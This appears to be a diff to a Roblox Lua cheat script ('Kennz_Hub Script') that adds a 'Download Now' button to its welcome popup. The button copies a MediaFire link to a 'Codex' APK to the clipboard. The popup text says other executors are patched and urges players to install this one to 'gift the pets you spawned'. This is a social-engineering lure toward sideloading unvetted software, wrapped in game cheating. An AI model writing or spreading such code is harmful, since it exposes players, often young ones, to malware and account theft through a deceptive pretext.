@@ -1,4 +1,4 @@
--- 📜 Welcome Message Popup with OK Button + Black Background + Fade Out
+-- 📜 Welcome Message Popup with OK + Styled Download Button + Black Background + Fade Out
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
@@ -12,51 +12,63 @@ welcomeGui.Parent = PlayerGui
 local background = Instance.new("Frame")
 background.Size = UDim2.new(1, 0, 1, 0)
 background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-background.BackgroundTransparency = 0.3 -- Slightly see-through
+background.BackgroundTransparency = 0.3
 background.Parent = welcomeGui
 
 -- Main frame
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 400, 0, 160)
-frame.Position = UDim2.new(0.5, -200, 0.5, -80)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Size = UDim2.new(0, 420, 0, 220)
+frame.Position = UDim2.new(0.5, -210, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 frame.BorderSizePixel = 0
 frame.Parent = background
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
 
 -- Title
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 35)
+title.Size = UDim2.new(1, 0, 0, 40)
 title.BackgroundTransparency = 1
 title.Text = "Welcome to Kennz_Hub Script"
 title.Font = Enum.Font.FredokaOne
-title.TextSize = 20
+title.TextSize = 22
 title.TextColor3 = Color3.fromRGB(255, 255, 0)
 title.Parent = frame
 
 -- Note text
 local note = Instance.new("TextLabel")
-note.Size = UDim2.new(1, -20, 1, -75)
-note.Position = UDim2.new(0, 10, 0, 40)
+note.Size = UDim2.new(1, -20, 1, -130)
+note.Position = UDim2.new(0, 10, 0, 50)
 note.BackgroundTransparency = 1
 note.TextWrapped = true
-note.Text = "⚠️ Note: If no menu pops up or pets can't spawn, rejoin the game and execute again — sometimes it’s bugged. Thank you!"
+note.Text = "⚠️ Delta and KRNL executor will not work on this script because of patch. You can click the Download button to use another executor so you can gift the pets you spawned. Thank you!"
 note.Font = Enum.Font.FredokaOne
 note.TextSize = 16
-note.TextColor3 = Color3.fromRGB(255, 255, 255)
+note.TextColor3 = Color3.fromRGB(230, 230, 230)
 note.Parent = frame
 
--- OK button
+-- OK button (green)
 local okBtn = Instance.new("TextButton")
-okBtn.Size = UDim2.new(0, 100, 0, 35)
-okBtn.Position = UDim2.new(0.5, -50, 1, -45)
-okBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+okBtn.Size = UDim2.new(0, 120, 0, 35)
+okBtn.Position = UDim2.new(0.25, -60, 1, -50)
+okBtn.BackgroundColor3 = Color3.fromRGB(50, 170, 70)
 okBtn.Text = "OK"
 okBtn.Font = Enum.Font.FredokaOne
 okBtn.TextSize = 18
 okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 okBtn.Parent = frame
-Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 8)
+Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)
+
+-- Download button (blue styled like real download)
+local dlBtn = Instance.new("TextButton")
+dlBtn.Size = UDim2.new(0, 180, 0, 40)
+dlBtn.Position = UDim2.new(0.75, -90, 1, -55)
+dlBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215) -- Nice blue
+dlBtn.Text = "⬇ Download Now"
+dlBtn.Font = Enum.Font.FredokaOne
+dlBtn.TextSize = 18
+dlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+dlBtn.Parent = frame
+Instance.new("UICorner", dlBtn).CornerRadius = UDim.new(0, 12)
 
 -- Fade out function
 local function fadeOutAndDestroy()
@@ -71,8 +83,28 @@ local function fadeOutAndDestroy()
 	wait(0.5)
 	welcomeGui:Destroy()
 end
+
 -- Close when clicked
 okBtn.MouseButton1Click:Connect(fadeOutAndDestroy)
+
+-- Download button action (copy to clipboard)
+local downloadLink = "https://www.mediafire.com/file/y25jjzrwafzr9zd/Codex+V2.683.apk/file"
+dlBtn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(downloadLink)
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "Download",
+			Text = "Link copied! Paste it in your browser.",
+			Duration = 5
+		})
+	else
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "Copy Failed",
+			Text = "Your executor does not support setclipboard.",
+			Duration = 5
+		})
+	end
+end)
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
